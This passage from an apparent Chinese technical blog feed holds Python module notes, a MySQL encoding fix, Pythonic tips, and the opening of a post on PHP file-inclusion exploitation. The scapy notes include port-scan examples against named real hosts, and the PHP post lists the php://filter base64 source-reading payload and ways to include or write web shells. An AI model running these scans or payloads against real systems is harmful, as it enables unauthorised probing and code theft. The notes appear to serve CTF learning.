timeout=xx)</div><div class="line"></div><div class="line"></div><div class="line">返回值：</div><div class="line">retu = s.get(<span class="string">"http://cauc.me"</span>)</div><div class="line"></div><div class="line">retu.context       <span class="comment">#返回的html文件</span></div><div class="line">retu.headers       <span class="comment">#返回的headers中的信息，是一个字典</span></div><div class="line">retu.status_code   <span class="comment">#返回http的状态值</span></div><div class="line"><span class="comment">#其他的返回值可以自己去测试下，都很简单，上面三个是经常用的</span></div></pre></td></tr></table></figure><hr><h2 id="collections"><a href="#collections" class="headerlink" title="collections"></a>collections</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">collections是一个非常方便的python内建集合模块，提供了许多有用的集合类</div><div class="line"></div><div class="line"><span class="comment">#defaultdict</span></div><div class="line">使用dict类型时，如果引用的key不存在，就会抛出KeyError一场，如果希望key不存在时，返回一个默认值，</div><div class="line">就可以使用defaultdict,这在很多场景下会很有用，之前我就经常在统计类型个数的时候使用</div><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</div><div class="line">dd = defaultdict(<span class="number">0</span>)</div><div class="line">dd[<span class="string">'xie'</span>] += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="comment">#namedtuple</span></div><div class="line">有些时候需要创建一个包含数据类型的类，比如要创建二位坐标类，使用Point(<span class="number">1</span>,<span class="number">2</span>)就要使用(<span class="number">1</span>,<span class="number">2</span>)明白的多</div><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</div><div class="line">point = namedtuple(<span class="string">'point'</span>, [<span class="string">'x'</span>,<span class="string">'y'</span>])</div><div class="line">p = point(<span class="number">1</span>,<span class="number">2</span>)</div><div class="line">p.x</div><div class="line">p.y</div><div class="line"></div><div class="line"><span class="comment">#除此之外还有的数据类型有：</span></div><div class="line">双向列表deque来代替单向列表list</div><div class="line">根据Key顺序对dict排序的OrderedDict</div><div class="line">计数器Counter,但是我一般习惯使用defaultDict来取得同样的效果</div><div class="line">ChinaMap  将map串联起来</div><div class="line">UserDict</div><div class="line">UserList</div><div class="line">UserString</div></pre></td></tr></table></figure><hr><h2 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"># 建立各种类型的包，构造函数并没有封装在类里，原理大概是类似于工厂方法式的初始化，</div><div class="line">IP()</div><div class="line">TCP()</div><div class="line">ICMP().. </div><div class="line"></div><div class="line"># 构造数据包，其实就是在为类里的成员变量传值</div><div class="line">IP().src = "10.5.24.1"</div><div class="line">TCP().dport = "https" .. </div><div class="line"></div><div class="line"># 发送数据包，相关函数同样没有封装在类里</div><div class="line">send(IP(),count = 100) 第三层的发包，也就是会在构造好的包上再用二层包封装起来，因此传入二层包时则会错误的包装成两层</div><div class="line">sendp()    第二层的发包，用于发送二层包</div><div class="line"></div><div class="line"># 展示包</div><div class="line">IP().show()    格式化展示包</div><div class="line">IP().show2()   格式化展示包，并且是计算之后等待发出的包了，比如包中的校验和已经计算完成</div><div class="line">raw(IP())      输出包的byte字符串，这是唯一一个输出等价于包数据，可直接用的数据</div><div class="line">hexdump(IP())  输出包的二进制相关信息</div><div class="line">IP().summary() 输出包摘要</div><div class="line">ls(IP())       以字段值显示包，类似show()</div><div class="line"></div><div class="line">IP(raw(IP()))  用raw(IP)的结果，用来初始化IP包，初始化好的包已经将None数据填充好了</div><div class="line"></div><div class="line">可以使用sprintf格式化输出包的信息，手法类似模板引擎</div><div class="line">IP.sprintf("%TCP.sport%--&gt;%TCP.dport%")</div><div class="line">sprintf支持&#123;&#125;语法，包里不确定有此层的话就将语句用&#123;&#125;包装起来，没有的话就自动不输出了</div><div class="line">IP.sprintf("&#123;TCP:%TCP.sport%&#125;&#123;ICMP:%IP.src% - %ICMP.type%&#125;")</div><div class="line"></div><div class="line"># 多层的包重载</div><div class="line">scapy中可以使用/来构造一个多层的包，这时包的初始化函数会根据上下文重载，包的参数会动态配置</div><div class="line">IP()/TCP()  </div><div class="line"></div><div class="line"># 配置等</div><div class="line">conf.iface  显示所使用的网卡</div><div class="line">conf.route  显示路由表</div><div class="line"></div><div class="line"></div><div class="line"># 抓包</div><div class="line">sniff()</div><div class="line">#里面支持的参数有</div><div class="line">count=10  #包个数</div><div class="line">fliter=(tcp dst port 80)  #使用BPF过滤器语法的过滤器</div><div class="line">prn=(lambda x: )  #对接收到的数据包进行处理的函数</div><div class="line">lfliter=(lambda x: ....)  #对接收到的包使用python函数的过滤器</div><div class="line">stop_fliter=(lambda x: x.haslayer(TCP))  #通过python函数的返回值，返回True后则会停止抓包</div><div class="line"># 返回值为PackageList类型</div><div class="line"></div><div class="line"></div><div class="line">@@ 发送一组包，并获得响应的包，可以用于探测，定制攻击等</div><div class="line"># 发送相关函数 </div><div class="line">#注 如果发送成功则只发送一组包，如果发送失败（失败的定义是没有返回包），则会一直发送，直到Crtl+C停止</div><div class="line">ans, unans = sr(IP(dst='www.baidu.com')/TCP(dport=80)/"GET / HTTP/1.0\r\n\r\n")  # 返回值ans中存储发送的包以及返回的包。unans为未响应的包</div><div class="line">ans = sr1(packet)  #ans中只存储返回的包，如果没有响应自然就没有值</div><div class="line">ans = srp(Ether()/ARP())   #用于二层发送一组包</div><div class="line"></div><div class="line"># 展示包</div><div class="line">ans[0][1]  ans[0]选中成功返回的包中的第一组，ans[0][1]选中这组包中的应答包</div><div class="line">在选中包或一组包之后即可输出</div><div class="line"></div><div class="line">ans     # 可以直观的看到接收到的一组包的情况</div><div class="line">&gt;&gt; ans</div><div class="line">&lt;Results: TCP:1 UDP:0 ICMP:0 Other:0&gt;</div><div class="line">&gt;&gt; unans</div><div class="line">&lt;Results: TCP:0 UDP:0 ICMP:0 Other:0&gt;</div><div class="line">                    </div><div class="line">ans.summary()    #显示详情，成功发送包的ans则显示从哪里到哪里</div><div class="line">&gt;&gt; ans.summary()</div><div class="line">IP / TCP 192.168.43.233:12346 &gt; 151.101.72.133:http S / Raw ==&gt; IP / TCP 151.101.72.133:http &gt; 192.168.43.233:12346 SA</div><div class="line">                </div><div class="line">ans.make_table(lambda p: (p[0][IP].dst, p[0][TCP].dport, p[1].sprintf("&#123;TCP:%TCP.flags%&#125;")))    #对于发送多个端口，多个ip的，可以使用这个函数做个简易的表展示出来， 根据标志位观察包的接收情况</div><div class="line"></div><div class="line"># 使用举例</div><div class="line">exp1: 扫描1-254网段内80端口存活的主机,使用RandShort()产生随机的源端口</div><div class="line">list = ["192.168.1."+str(i) for i in range(1,255)]</div><div class="line">ans, unans = sr(IP(dst=list)/TCP(sport=RandShort(), dport=80))</div><div class="line"></div><div class="line">exp2: 扫描端口的开放情况，使用RandShort()产生随机的源端口</div><div class="line">list = [i for i in range(0,10000)]</div><div class="line">ans, unans = sr(IP(dst="118.89.16.36")/TCP(sport=RandShort(), dport=list))</div><div class="line"></div><div class="line">exp3: 发送ACK包, 测试结果返回RST的flag，因为ACK包是在SYN包之后才应该出现的，因此对方主机返回RST重置标志</div><div class="line">ans, unans = sr(IP(dst="www.cauc.edu.cn")/TCP(sport=888, dport=[21,22,80,443], flags="A"))</div><div class="line"></div><div class="line">exp4: 模拟dns查询</div><div class="line">ans, unans(IP(dst="192.168.43.1")/UDP()/DNS(rd=1, qd=DNSQR(qname="www.baidu.com")))</div><div class="line">ans[0][1]  # 查看DNS返回的内容</div></pre></td></tr></table></figure><h2 id="webdriver"><a href="#webdriver" class="headerlink" title="webdriver"></a>webdriver</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@@配置webdriver</span></div><div class="line"><span class="comment"># 设置webdriver的http请求头</span></div><div class="line">webdriver.DesiredCapabilities.PHANTOMJS[<span class="string">"phantomjs.page.customHeaders.X-Forwarded-For"</span>] = <span class="string">"123.232.23.245"</span></div><div class="line"></div><div class="line"><span class="meta">@@指定驱动器，生成一个页面</span></div><div class="line"><span class="comment"># 为webdriver设置驱动器, 可选phantomJS, firefox, chrome，类似产生一个页面</span></div><div class="line">driver = webdriver.PhantomJS(executable_path=<span class="string">r"G:\phantomjs\bin\phantomjs.exe"</span>)</div><div class="line"></div><div class="line"><span class="meta">@@对页面进行操作</span></div><div class="line"><span class="comment"># 页面driver请求url</span></div><div class="line">driver.get(<span class="string">"http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php"</span>)</div><div class="line"><span class="comment"># 页面执行js代码，可以对页面的DOM进行操作</span></div><div class="line">driver.execute_script(<span class="string">"""document.getElementById('author').type = "text";"""</span>)</div><div class="line"><span class="comment"># 获取DOM中的元素</span></div><div class="line">id = driver.find_element_by_id(<span class="string">"id"</span>)</div><div class="line"><span class="comment"># 操作元素内容</span></div><div class="line">sendId = raw_input(<span class="string">"id:"</span>)</div><div class="line">button.click()</div><div class="line"></div><div class="line"><span class="meta">@@打印页面当前信息</span></div><div class="line"><span class="keyword">print</span> driver.current_url</div><div class="line"><span class="keyword">print</span> driver.page_source</div><div class="line"><span class="keyword">print</span> driver.get_cookies()</div><div class="line"><span class="keyword">print</span> driver.title</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;目前使用到的模块有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;json&lt;/li&gt;
&lt;li&gt;configparser&lt;/li&gt;
&lt;li&gt;文件读写&lt;/li&gt;
&lt;li&gt;os&lt;/li&gt;
&lt;li&gt;sys&lt;/li&gt;
&lt;li&gt;re&lt;/li&gt;
&lt;li&gt;BeautifulSoup&lt;/li&gt;
&lt;li&gt;requests&lt;/li&gt;
&lt;li&gt;collections&lt;/li&gt;
&lt;li&gt;scapy&lt;/li&gt;
&lt;li&gt;webdriver&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql数据库编码问题的原因与解决方法</title>
    <link href="https://someonesometimes.github.io/2017/05/31/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98%E7%9A%84%E5%8E%9F%E5%9B%A0%E4%B8%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>https://someonesometimes.github.io/2017/05/31/mysql数据库编码问题的原因与解决方法/</id>
    <published>2017-05-31T11:35:32.000Z</published>
    <updated>2017-06-26T04:25:16.747Z</updated>
    
    <content type="html"><![CDATA[<p>好像这里必须要写点什么才不会显示整篇文章<br><a id="more"></a><br>mysql为不同场景下配置了不同的编码方案，像数据的存储，数据库连接的当前编码，我们通过sql语句<code>show variables like &#39;%character%&#39;;</code>就可以看到如下显示：<img src="http://i.imgur.com/UthX236.png" alt="">详细解释了各种场景下编码的意义：</p><blockquote><p>a、其中client是客户端使用的字符集，相当于网页中的字符集设置如下 </p><p><metahttp-equiv="content-type"content="text html;="" charset="utf-8"">。<br>b、其中的connection是连接数据库的字符集设置类型，如果php没有指明连接数据库使用的字符集类型<br>就按照服务器端默认的字符集设置。<br>c、其中database是数据库服务器中某个库使用的字符集设定，如果建库时没有指明，将使用服务器安装<br>时指定的字符集设置。<br>d、results是数据库给客户端返回时使用的字符集设定，如果没有指明，使用服务器默认的字符集。<br>e、server是服务器安装时指定的默认字符集设定。<br>f、system是数据库系统使用的字符集设定。 </metahttp-equiv="content-type"content="text></p></blockquote><p>我们从PHP对数据库进行操作的一次过程中，涉及到多个场景，先是PHP自身编码方案决定了它构建并发出的那条sql语句是什么编码的，之后语句执行后拿到的数据又会是一种编码，就是数据库中存储数据的编码方案，之后再以发送给php，这些场景中数据的编码方案是不同的，而mysql会在不同场景切换中对数据进行编码转换话，如果执行过程中数据的编码转化与mysql上表的配置不同，就会出现编码的问题，而出现问题的原因一般有两条：</p><h3 id="数据库对数据存储的编码方案"><a href="#数据库对数据存储的编码方案" class="headerlink" title="数据库对数据存储的编码方案"></a>数据库对数据存储的编码方案</h3><p>这个问题的产生比较奇怪，从上面表的character_set_database 我们可以看到，默认的数据库对数据存储的编码方案采用的是<strong>latin1</strong>，这种编码方案收录的字符除ASCII收录的字符外，还包括西欧语言、希腊语、泰语、阿拉伯语、希伯来语对应的文字符号，<strong>但是没有中文！！！！</strong>所以遇到中文的编码方案会出现报错或是乱码。。。<br>解决的方式也很简单，我们在新建数据库时为其指定默认的编码方案，使用支持中文的gbk,utf8编码就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">create database test default character set gbk;</div><div class="line">create database test default character set utf8;</div></pre></td></tr></table></figure></p><p>之后进入到这个数据库再看编码方案，在character_set_database那一栏就会有对应的修改了</p><h3 id="sql语句的编码方案"><a href="#sql语句的编码方案" class="headerlink" title="sql语句的编码方案"></a>sql语句的编码方案</h3><p>也就所输入sql语句是怎样编码的，如果sql语句的编码与mysql中记录的理解方式也就是编码方案不同，那自然也会出现问题。<br>给出几个场景的例子，比如我在cmd中对mysql进行操作，cmd的默认编码是GBK<img src="http://i.imgur.com/i6JDGa7.png" alt=""><br>而mysql中会按照记录中的utf8进行操作，这时就是出现问题<br>再比如PHP所发出的sql语句具体采用什么编码方案，取决于PHP运行环境中的编码（如果你不进行手动的解码再编码到指定码的话），这时也有可能出现于mysql中默认编码方案不同的问题</p><p>解决方式同样很简单，我们进行数据库操作时候，无论是使用命令行，还是调用高级语言的接口，都先指定自己的sql语句是以什么形式编码的，即语句<code>set names 编码方案</code>。这样之后就会修改当前操作下mysql的编码方案，像这张图就是我执行<code>set names gbk</code>后的改变结果：<img src="http://i.imgur.com/XVYIRtx.png" alt=""></p><h3 id="正好今天在用python3链接数据库，把我的编码配置扔出来"><a href="#正好今天在用python3链接数据库，把我的编码配置扔出来" class="headerlink" title="正好今天在用python3链接数据库，把我的编码配置扔出来"></a>正好今天在用python3链接数据库，把我的编码配置扔出来</h3><ul><li>数据库编码还是在创建时改为utf8</li><li>链接时指定客户端编码<br><code>pymysql.connect(host=&#39;localhost&#39;, port=3306, user=&#39;root&#39;, passwd=&#39;root&#39;, db=&#39;blog&#39;, charset=&#39;utf8&#39;)</code></li><li>指定编码格式<br><code>cur.execute(&quot;set names utf8&quot;)</code></li></ul><p>然后就OK了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好像这里必须要写点什么才不会显示整篇文章&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>优化 pythonic</title>
    <link href="https://someonesometimes.github.io/2017/05/28/%E4%BC%98%E5%8C%96-pythonic/"/>
    <id>https://someonesometimes.github.io/2017/05/28/优化-pythonic/</id>
    <published>2017-05-28T05:12:11.000Z</published>
    <updated>2017-10-01T16:44:13.813Z</updated>
    
    <content type="html"><![CDATA[<p>使用python已经有很长一段时间了，在比赛中python语言的简洁易懂性给了我很大的帮助。当对一项技能使用的熟练度到达一定程度的时候，就该重新入门了。本文章将长期保持更新，收集记录各种python黑魔法，努力使自己的代码变得更加pythonic！<br><a id="more"></a></p><p><strong>变量交换</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a,b = b,a</div></pre></td></tr></table></figure></p><hr><p><strong>对可变字符串不建议再使用temp = “(“+str(i)+”,”+str(j)+”)”的写法，给两种替换：</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">temp = <span class="string">"(&#123;x&#125;,&#123;y&#125;)"</span>.format(x=str(i), y=str(j))</div><div class="line">temp = <span class="string">"(%(x),%(y))"</span> % &#123;<span class="string">'x'</span>:str(i), <span class="string">'y'</span>:str(j)&#125;</div></pre></td></tr></table></figure></p><hr><p><strong>类似于C里面的三元操作符：</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">X <span class="keyword">if</span> X&lt;Y <span class="keyword">else</span> Y</div></pre></td></tr></table></figure></p><hr><p><strong>直接生成的列表（不是那种定义后一直要修改的）</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fr = open(<span class="string">"F://xie.txt"</span>)</div><div class="line">list = [i <span class="keyword">for</span> i <span class="keyword">in</span> fr.readlines()]</div></pre></td></tr></table></figure></p><hr><p><strong>python装饰器</strong><br>作用就是为函数外加一层代码，可以用于日志记录，函数运行时间记录，对于不合适的函数进行代码补充等等场景<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">runTime</span><span class="params">(tag = True)</span>:</span></div><div class="line"><span class="keyword">if</span> tag == <span class="keyword">True</span>:</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_deco</span><span class="params">(func)</span>:</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">startTime = time.time()</div><div class="line">retu = func(*args, **kwargs)</div><div class="line">endTime = time.time()</div><div class="line"><span class="keyword">print</span> (<span class="string">"RunTime is &#123;time&#125;"</span>.format(time=endTime-startTime))</div><div class="line"><span class="keyword">return</span> retu</div><div class="line"><span class="keyword">return</span> wrapper</div><div class="line"><span class="keyword">else</span>:</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_deco</span><span class="params">(func)</span>:</span></div><div class="line"><span class="keyword">return</span> func</div><div class="line"><span class="keyword">return</span> _deco</div><div class="line"></div><div class="line"><span class="meta">@runTime(True)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">myFunc</span><span class="params">(path)</span>:</span></div><div class="line">fr = open(path)</div><div class="line">list = [i <span class="keyword">for</span> i <span class="keyword">in</span> fr.readlines]</div><div class="line"></div><div class="line">myFunc(<span class="string">"F://xie.txt"</span>)</div></pre></td></tr></table></figure></p><p><strong>@runTime(True)相当于：myFunc = runTime(True)(myFunc(path))</strong></p><p><strong>调用逻辑为：</strong></p><ol><li>runTime(True) 返回_deco 因此等价于 _deco函数</li><li>_deco(myFunc(path))返回wrapper 因此等价于 wrapper函数</li><li>所以myFunc 等价于 执行逻辑之后的wrapper(path)函数</li></ol><p><strong>装饰器书写需要把握的重点是：</strong></p><ul><li>装饰器的本质是函数转换，经过@之后的那个函数其实最后都是变为装饰代码后的wrapper函数</li><li>基本的函数转换方式就是在每层函数中定义个子函数，然后逻辑执行后return 子函数</li></ul><hr><p><strong>python函数中的可变参数：</strong><br>其实实现原理很简单，def xie(<em>args, **kwargs)中的</em>args就相当于一个list， **kwargs就相当于一个dict，只是python为方便使用做出了进一步定义<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">def xie(farg, *args)</div><div class="line">xie(1, 'two', 3) ==&gt; xie(1, ['two',3])</div><div class="line"></div><div class="line">def xie(farg, **kwargs)</div><div class="line">xie(1, url='/xss', method='get') ==&gt; xie(1, &#123;"url":'/xss', 'method':'get'&#125;)</div><div class="line"></div><div class="line">def xie(arg1, arg2, arg3)</div><div class="line">args = [2, 3]</div><div class="line">xie(1, *args) ==&gt; xie(1, 2, 3)</div><div class="line"></div><div class="line">def xie(arg1, arg2, arg3)</div><div class="line">kwargs = &#123;'arg1':1, 'arg2':2, 'arg3':3&#125;</div><div class="line">xie(**kwargs) ==&gt; xie(1, 2, 3)</div></pre></td></tr></table></figure></p><hr><p><strong>迭代器中使用计数模式</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fr = open(<span class="string">"F://xie.txt"</span>, <span class="string">'r'</span>)</div><div class="line"><span class="keyword">for</span> index, i <span class="keyword">in</span> enumerate(fr.readlines(), <span class="number">1</span>):</div><div class="line"><span class="keyword">print</span> (<span class="string">"&#123;index&#125;:&#123;i&#125;"</span>.format(index=index, i=i))</div></pre></td></tr></table></figure></p><p>将迭代列表用enumerate对象封装，每次迭代值返回两个————index, data。<br>同时enumerate()的第二个参数用于指定index的起始值，默认为0</p><hr><p><strong>对于对象的迭代器遍历如果只是为了循环检测是否存在某种情况，可以这样写：</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[row[<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> row[<span class="number">2</span>]!=<span class="string">'Yes'</span> <span class="keyword">for</span> row <span class="keyword">in</span> rows]</div></pre></td></tr></table></figure></p><p>之后使用any()  all() 函数做检测<br>any([1,0,0])列表中存在1即返回真      all([1,1,1])列表中全为真则返回真<br>因此具体可以这样写<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">any([row[<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> row[<span class="number">2</span>]!=<span class="string">'Yes'</span> <span class="keyword">for</span> row <span class="keyword">in</span> rows])</div></pre></td></tr></table></figure></p><hr><p><strong>之前对dict的操作认识太浅显，重新整理下dict操作</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">获取字典中的值，get()函数支持默认参数方法，在没有键值的时候使用默认参数</div><div class="line">dict.get(<span class="string">'xie'</span>, <span class="string">'fei'</span>)</div><div class="line"></div><div class="line">检测键是否存在,存在会返回对应的值，不存在会返回<span class="keyword">None</span></div><div class="line">dict.get(<span class="string">'xie'</span>)</div><div class="line">另一种方法是在dict.keys()列表中寻找</div><div class="line"></div><div class="line">返回dict中的所有键：</div><div class="line">dict.keys()</div><div class="line"></div><div class="line">返回dict中所有值：</div><div class="line">dict.values()</div><div class="line"></div><div class="line">更新字典，也就是添加没有的键值对，为键对应的值改变的进行更新。类似于加运算吧</div><div class="line">dict.update(dict2)</div></pre></td></tr></table></figure></p><hr><p><strong>使用defaultdict类型来进行遍历的结果记录</strong><br>在对遍历结果统计时经常使用dict类型来记录，但dict在这种情况下有个问题就是，如果是第一次引用一个键，dict[‘xie’] += 1就会出现问题，需要先dict[‘xie’] = 0,再dict[‘xie’] += 1，而defaultdict会在dict[]遇到新的键时为其分配指定的值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</div><div class="line"></div><div class="line">list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">5</span>]</div><div class="line">dict = defaultdict(int)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</div><div class="line">dict[i]+=<span class="number">1</span></div></pre></td></tr></table></figure></p><hr><p><strong>更加健壮的python程序需要进行参数检查：</strong></p><p>要检查的数据有：</p><ol><li>用户输出的数据</li><li>从文件中解析出来的数据，如从网页中解析出来的数据，从txt中获取的数据</li></ol><p>需要在以下几个地方做参数检查：</p><ol><li>最初遇到这种参数时就做出了检查</li><li>必须保证安全性关键的子函数，如果def download(url)</li><li>检测函数中，经常会做切片分析检测，要防止越界</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用python已经有很长一段时间了，在比赛中python语言的简洁易懂性给了我很大的帮助。当对一项技能使用的熟练度到达一定程度的时候，就该重新入门了。本文章将长期保持更新，收集记录各种python黑魔法，努力使自己的代码变得更加pythonic！&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP文件包含，文件读取的利用思路，以及配合伪协议的trick</title>
    <link href="https://someonesometimes.github.io/2017/05/11/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%EF%BC%8C%E4%BB%A5%E5%8F%8A%E9%85%8D%E5%90%88%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84trick/"/>
    <id>https://someonesometimes.github.io/2017/05/11/PHP文件包含，文件读取的利用思路，以及配合伪协议的trick/</id>
    <published>2017-05-11T13:54:08.000Z</published>
    <updated>2017-10-23T09:21:49.924Z</updated>
    
    <content type="html"><![CDATA[<p><strong>PHP的文件包含函数有两类，分三种：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">file_get_contents() </div><div class="line"><span class="keyword">include</span>()/<span class="keyword">include_once</span>()  <span class="keyword">require</span>/<span class="keyword">require_once</span>()</div></pre></td></tr></table></figure></p><p>第一种用于获取文件的数据，第二种用于包含并执行代码与读取文件两种功能</p><p><strong>php写文件的函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_put_contents()</div></pre></td></tr></table></figure><p>基本的思路就是用来写shell吧，不过会有各种限制，但是结合伪协议就可以简单绕过了</p><a id="more"></a><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>这个函数经常用于获取文件内容，尤其是php文件的代码，配合伪协议中的元封装器php://filter/convert.base64-encode/resource=class.php<br>几乎已经成了公认的文件获取姿势</p><h3 id="include-require"><a href="#include-require" class="headerlink" title="include() / require()"></a>include() / require()</h3><p><strong>首先说下两者的唯一不同</strong></p><ol><li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li><li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li></ol><p><strong>此函数利用的原理</strong><br>把参数作为一个php文件去运行，所以基本使用方法有拿运行环境与拿输出代码两种作用</p><p><strong>这种文件包含利用的目的无外乎以下几种：</strong></p><ul><li>使用php://filter/convert.base64-encode/resource=xxx来读文件源码</li><li>包含shell代码文件（自己上传的，写的等各种方式），使代码具有php的执行环境</li><li>包含使用伪协议自定的数据流，常用于写shell</li><li>包含关键文件，获得该文件的输出结果与执行环境（就比如说关键文件中的变量引入）</li></ul><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" 